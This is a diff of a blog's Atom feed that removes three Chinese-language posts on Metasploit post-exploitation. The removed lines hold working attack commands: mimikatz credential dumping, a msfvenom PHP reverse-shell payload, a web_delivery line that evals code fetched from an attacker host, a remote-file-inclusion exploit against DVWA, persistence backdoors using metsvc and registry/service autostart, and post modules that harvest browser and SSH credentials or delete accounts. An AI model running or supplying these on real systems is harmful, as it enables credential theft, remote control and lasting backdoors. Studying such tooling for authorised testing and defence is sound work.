       <category term="python" scheme="http://c.cat.plus/tags/python/"/>
+    
+      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
+    
+      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
     
       <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
     
@@ -356,9 +442,9 @@ ro
     
       <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
     
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
       <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
+    
+      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
     
       <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
     
@@ -637,125 +723,6 @@ ro
       <category term="Karmetasploit" scheme="http://c.cat.plus/tags/Karmetasploit/"/>
     
       <category term="dhcp" scheme="http://c.cat.plus/tags/dhcp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MsF后渗透测试阶段各种延伸用法</title>
-    <link href="http://c.cat.plus/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/"/>
-    <id>http://c.cat.plus/2016/03/17/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E5%90%84%E7%A7%8D%E5%BB%B6%E4%BC%B8%E7%94%A8%E6%B3%95/</id>
-    <published>2016-03-16T22:37:10.000Z</published>
-    <updated>2020-07-08T02:57:09.002Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="MsF延伸用法之Mimikatz"><a href="#MsF延伸用法之Mimikatz" class="headerlink" title="MsF延伸用法之Mimikatz"></a><strong>MsF延伸用法之Mimikatz</strong></h4><p><strong>hashdump 使用的就是mimikatz的部分功能</strong></p><pre><code>#meterpreterhashdumpgetsystem        #使用mimikatz需要先获取system权限load mimikatz    #加载mimikatzwdigest            #查看内存存储的明文密码信息kerberos        #查看内存存储的明文密码信息msv                #获取系统用户密码hash身份认证信息ssp                #获取明文的身份认证信息livessp            #获取明文的身份认证信息tspkg            #也是查看身份认证信息的命令#重点命令mimikatz_command -hmimikatz_command -f a::                    #加一个错误的模块名,可以当帮助使用mimikatz_command -f samdump::hashes            #获取samdump数据库的信息mimikatz_command -f handle::list            #查看系统进程mimikatz_command -f service::list            #查看系统服务mimikatz_command -f crypto::listProviders    #加密套件mimikatz_command -f winmine::infos            #扫雷作弊工具,纯属好玩的模块</code></pre><h4 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a><strong>PHP shell</strong></h4><pre><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</code></pre><ul><li>MSF 启动侦听<ul><li>上传到web站点并通过浏览器访问,执行反弹shell</li></ul></li></ul><h4 id="Web-Delivery"><a href="#Web-Delivery" class="headerlink" title="Web Delivery"></a><strong>Web Delivery</strong></h4><ul><li>利用远程代码执行漏洞访问攻击者服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set URIPATH &#x2F;</span><br><span class="line">set lhost 192.168.190.178</span><br><span class="line">;php -d allow_url_fopen&#x3D;true -r “eval(file_get_contents(‘http:&#x2F;&#x2F;1.1.1.1&#x2F;fTYWqmu&#39;));&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a><strong>RFI 远程文件包含</strong></h4><pre><code>vi /etc/php5/cgi/php.ini        #php info 配置文件    allow_url_fopen = On    allow_url_include = On</code></pre><ul><li>使用php_include远程文件包含漏洞MSF模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;php_include</span><br><span class="line">set RHOST 1.1.1.2</span><br><span class="line">set PATH &#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;</span><br><span class="line">set PHPURI &#x2F;?page&#x3D;XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security&#x3D;low;PHPSESSID&#x3D;eefcf023ba61219d4745ad7487fe81d7&quot;</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;MsF延伸用法之Mimikatz&quot;&gt;&lt;a href=&quot;#MsF延伸用法之Mimikatz&quot; class=&quot;headerlink&quot; title=&quot;MsF延伸用法之Mimikatz&quot;&gt;&lt;/a&gt;&lt;strong&gt;MsF延伸用法之Mimikatz&lt;/strong&gt;&lt;/h4&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
-    
-    
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
-      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
-    
-      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
-    
-      <category term="后门持久化" scheme="http://c.cat.plus/tags/%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
-    
-      <category term="hashdump" scheme="http://c.cat.plus/tags/hashdump/"/>
-    
-      <category term="远程文件包含" scheme="http://c.cat.plus/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-      <category term="远程代码执行" scheme="http://c.cat.plus/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MsF后渗透测试阶段之后门持久化</title>
-    <link href="http://c.cat.plus/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
-    <id>http://c.cat.plus/2016/03/16/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8B%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/</id>
-    <published>2016-03-16T11:37:28.000Z</published>
-    <updated>2020-07-08T06:37:52.897Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a><strong>持久后门</strong></h4><ul><li>利用漏洞取得的meterpreter shell 运行于内存中,重启失效</li><li>重复 exploit 漏洞可能造成服务崩溃</li><li>持久后门保证漏洞修复后仍可远程控制</li></ul><ol><li><p><strong>Meterpreter脚本实现的正向持久后门</strong> - 缺点是别人发现了该端口都可以连</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A#删除 -r,安装并启动metsvc服务,默认31337端口</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;metsvc_bind_tcp#使用metsvc payload模块连接</span><br><span class="line">set LPORT 31337</span><br><span class="line">set RHOST 1.1.1.1</span><br></pre></td></tr></table></figure></li><li><p><strong>Meterpreter脚本实现的反弹持久后门</strong></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run persistence -h</span><br><span class="line">run persistence -X -i 10 -p 4444 -r 1.1.1.1#写入脚本和注册表启动项启动</span><br><span class="line">background</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 1.1.1.1</span><br><span class="line">set lport 4444</span><br><span class="line">set exitonsession false#持续侦听端口配置参数</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">#其它两个参数</span><br><span class="line">run persistence -U -i 20 -p 4444 -r 1.1.1.1</span><br><span class="line">run persistence -S -i 20 -p 4444 -r 1.1.1.1#-S 服务启动</span><br></pre></td></tr></table></figure></li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;持久后门&quot;&gt;&lt;a href=&quot;#持久后门&quot; class=&quot;headerlink&quot; title=&quot;持久后门&quot;&gt;&lt;/a&gt;&lt;strong&gt;持久后门&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;利用漏洞取得的meterpreter shell 运行于内存中,重启失效&lt;/l
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
-    
-    
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
-      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
-    
-      <category term="metsvc" scheme="http://c.cat.plus/tags/metsvc/"/>
-    
-      <category term="persistence" scheme="http://c.cat.plus/tags/persistence/"/>
-    
-      <category term="后门持久化" scheme="http://c.cat.plus/tags/%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MsF后渗透测试阶段之meterpreter脚本及post模块</title>
-    <link href="http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/"/>
-    <id>http://c.cat.plus/2016/03/15/Exploits/MsF/MsF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%98%B6%E6%AE%B5%E4%B9%8Bmeterpreter%E8%84%9A%E6%9C%AC%E5%8F%8Apost%E6%A8%A1%E5%9D%97/</id>
-    <published>2016-03-15T10:35:18.000Z</published>
-    <updated>2020-07-07T09:08:37.985Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="POST-模块-在已经取得meterpreter之后使用的模块"><a href="#POST-模块-在已经取得meterpreter之后使用的模块" class="headerlink" title="POST 模块(在已经取得meterpreter之后使用的模块)"></a><strong>POST 模块</strong>(在已经取得meterpreter之后使用的模块)</h4><p><strong>获取meterpreter</strong></p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 1.1.1.1set exitonsession false        #持续侦听端口配置参数exploit -j -z</code></pre><p><strong>常用POST模块</strong>    </p><pre><code>#在meterpreter下输入run按tab键会提示有大量POST模块和脚本run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24    #扫描目标网段run post/windows/gather/checkvm        #检查是否为虚拟机run post/windows/gather/credentials/credential_collector    #获取目标机器账号等身份认证信息run post/windows/gather/enum_applications        #获取目标机器安装的应用程序run post/windows/gather/enum_logged_on_users    #获取目标系统正在登录中的账号run post/windows/gather/enum_snmp                #查看目标系统是否开启snmp服务run post/multi/recon/local_exploit_suggester    #获取目标系统可用来本地提权的漏洞信息run post/windows/manage/delete_user USERNAME=yuanfh        #删除目标系统账号run post/multi/gather/env                #获取目标系统一些敏感信息run post/multi/gather/firefox_creds        #收集firefox浏览器保存的密码信息run post/multi/gather/ssh_creds            #获取本地保存的SSH身份验证信息,适用linuxrun post/multi/gather/check_malware REMOTEFILE=c:\\a.exe    #检查目标系统的某个程序是否为恶意程序</code></pre><h4 id="另一种运行POST模块的方法"><a href="#另一种运行POST模块的方法" class="headerlink" title="另一种运行POST模块的方法"></a><strong>另一种运行POST模块的方法</strong></h4><p><strong>自动执行meterpreter脚本</strong></p><pre><code>show advanced        #显示高级设置参数set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com    #进入meterpreter自动修改hosts文件set InitialAutoRunScript checkvm</code></pre><p><strong>利用高级设置参数自动执行POST模块</strong></p><pre><code>set InitialAutoRunScript migrate -n explorer.exe    #需先设置迁移目标用户权限的进程set AutoRunScript post/windows/gather/dumplinks        #再设置获取最近打开文档路径</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h4 id=&quot;POST-模块-在已经取得meterpreter之后使用的模块&quot;&gt;&lt;a href=&quot;#POST-模块-在已经取得meterpreter之后使用的模块&quot; class=&quot;headerlink&quot; title=&quot;POST 模块(在已经取得meterpreter之后使用的模
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
-    
-      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
-    
-    
-      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
-    
-      <category term="dumplinks" scheme="http://c.cat.plus/tags/dumplinks/"/>
-    
-      <category term="hosts编辑" scheme="http://c.cat.plus/tags/hosts%E7%BC%96%E8%BE%91/"/>
-    
-      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
-    
-      <category term="迁移进程" scheme="http://c.cat.plus/tags/%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/"/>
     
   </entry>
   
